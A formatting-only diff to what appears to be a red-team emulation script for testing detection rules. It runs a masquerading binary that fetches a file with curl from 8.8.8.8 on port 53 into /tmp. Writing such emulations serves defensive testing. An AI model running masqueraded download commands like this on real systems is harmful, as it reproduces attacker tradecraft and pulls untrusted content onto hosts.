@@ -4,6 +4,7 @@
 # 2.0.
 
 import sys
+
 from . import RtaMetadata, common
 
 metadata = RtaMetadata(
@@ -29,7 +30,7 @@ def main() -> None:
     common.log("Granting execute permissions...")
     common.execute(["chmod", "+x", masquerade])
 
-    commands = [masquerade, '-c', 'curl http://8.8.8.8:53/foo > /tmp/foo && xxd']
+    commands = [masquerade, "-c", "curl http://8.8.8.8:53/foo > /tmp/foo && xxd"]
     common.execute([*commands], timeout=5, kill=True)
     common.log("Cleaning...")
     common.remove_file(masquerade)
